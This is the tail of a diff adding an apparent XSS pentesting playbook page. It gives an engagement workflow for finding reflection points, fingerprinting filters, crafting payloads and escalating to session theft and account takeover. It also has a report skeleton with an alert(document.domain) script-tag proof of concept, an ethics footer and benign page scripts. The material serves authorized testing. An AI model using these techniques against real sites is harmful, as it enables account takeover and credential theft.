+      <p>Denylists failed in A3–A5, D1, D2 — attackers fuzz faster than you can list. Use input validation for anomaly detection and defense-in-depth, never as the primary control.</p></div>
+  </div>
+</section>
+
+<!-- ============ 08 WORKFLOW ============ -->
+<section id="workflow">
+  <div class="sec-head rv"><span class="sec-num">08</span><h2>Engagement Workflow &amp; Report Skeleton</h2><span class="tag">runbook</span></div>
+  <ol class="check rv">
+    <li><div><b>Map reflection points.</b> <span>Every parameter, header (<code>Referer</code>, <code>User-Agent</code>), path segment, fragment, and stored field. Note what returns unchanged.</span></div></li>
+    <li><div><b>Determine context.</b> <span>View source around each reflection — body, attribute (which quotes?), script block, URL, expression, JSON.</span></div></li>
+    <li><div><b>Fingerprint the filter.</b> <span>Compare input vs. output character by character. Which of <code>&lt; &gt; " ' \ ` $ { }</code> survive? Stripped, encoded, or escaped?</span></div></li>
+    <li><div><b>Match the ladder.</b> <span>Find your row in the §00 encoding ladder; pick the counter-move.</span></div></li>
+    <li><div><b>Craft the minimal payload.</b> <span>Confirm with <code>alert(document.domain)</code>. For DOM XSS, test via <code>#</code> and <code>postMessage</code> first.</span></div></li>
+    <li><div><b>Establish the trigger.</b> <span>Auto on load? Hover? Click? Access key? Victim visiting a stored page? This defines real-world exploitability.</span></div></li>
+    <li><div><b>Escalate to impact.</b> <span>Run E1 → E2 → E3 as applicable. Screenshot the session replay / captured creds / forged action.</span></div></li>
+    <li><div><b>Report with the chain.</b> <span>Context + trigger + escalation chain + concrete fix from §07.</span></div></li>
+  </ol>
+  <div class="codebox rv"><h4>Report skeleton</h4><button class="copy">copy</button>
+    <pre><code>## XSS — &lt;context&gt; — &lt;endpoint&gt;
+Severity: High / Critical (CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
+Affected: GET /search?q=  (reflected, HTML body context, no encoding)
+
+Proof of concept:
+  https://target/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+Trigger: automatic on page load — no interaction required
+Impact:  session theft (E1) → CSRF-bypass email change (E3) → account takeover
+Chain:   A1 → E1 → E3
+
+Remediation: context-aware output encoding (§07-D1) + CSP nonce (§07-D4)
+             + HttpOnly session cookies (§07-D5)</code></pre></div>
+</section>
+
+</main>
+</div>
+
+<footer>
+  <div class="foot">
+    <div>
+      <h5>Scope &amp; Ethics</h5>
+      <p>This playbook is for authorized penetration testing, bug bounty hunting on in-scope targets, and defensive engineering. Never execute these techniques against systems you don't own or aren't contracted to test. Payloads use <code>alert(document.domain)</code> as a harmless execution proof — keep PoCs non-destructive.</p>
+    </div>
+    <div>
+      <h5>References</h5>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger — Cross-Site Scripting</a> (scenarios map to WSA labs)</li>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger XSS Cheat Sheet</a> — events &amp; vectors</li>
+        <li><a href="https://html.spec.whatwg.org/multipage/parsing.html">HTML Living Standard — parsing modes</a></li>
+      </ul>
+    </div>
+  </div>
+</footer>
+
+<button id="toTop" aria-label="Back to top">↑</button>
+
+<script>
+const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
+
+/* duplicate ticker for seamless loop */
+const tick=$('#tick'); tick.innerHTML+=tick.innerHTML;
+
+/* copy buttons */
+$$('.copy').forEach(b=>b.addEventListener('click',()=>{
+  const code=b.closest('.codebox').querySelector('code');
+  navigator.clipboard.writeText(code.innerText).then(()=>{
+    b.textContent='copied ✓'; b.classList.add('ok');
+    setTimeout(()=>{b.textContent='copy'; b.classList.remove('ok')},1300);
+  });
+}));
+
+/* progress + back to top */
+addEventListener('scroll',()=>{
+  const h=document.documentElement;
+  $('#progress').style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight)*100)+'%';
+  $('#toTop').classList.toggle('show',h.scrollTop>600);
+},{passive:true});
+$('#toTop').onclick=()=>scrollTo({top:0,behavior:'smooth'});
+
+/* scroll reveal */
+const io=new IntersectionObserver(es=>es.forEach(e=>{
+  if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target)}
+}),{threshold:.06});
+$$('.scn,.rv').forEach(el=>io.observe(el));
+
+/* scrollspy */
+const links=$$('.toc a[href^="#"]'), map=new Map();
+links.forEach(a=>{const t=document.getElementById(a.getAttribute('href').slice(1));if(t)map.set(t,a)});
+const spy=new IntersectionObserver(es=>es.forEach(e=>{
+  if(e.isIntersecting){links.forEach(l=>l.classList.remove('active'));const a=map.get(e.target);if(a)a.classList.add('active')}
+}),{rootMargin:'-8% 0px -78% 0px'});
+map.forEach((a,t)=>spy.observe(t));
+
+/* filter + search */
+let curType='all';
+const cards=$$('.scn');
+function apply(){
+  const q=$('#search').value.trim().toLowerCase(); let n=0;
+  cards.forEach(c=>{
+    const ok=(curType==='all'||c.dataset.type===curType)&&c.dataset.title.includes(q);
+    c.style.display=ok?'':'none'; if(ok)n++;
+  });
+  $('#count').textContent=n+' / '+cards.length+' scenarios shown';
+}
+$$('.chip').forEach(ch=>ch.onclick=()=>{
+  $$('.chip').forEach(c=>c.classList.remove('on'));
+  ch.classList.add('on'); curType=ch.dataset.f; apply();
+});
+$('#search').addEventListener('input',apply);
+apply();
+</script>
+</body>
+</html>
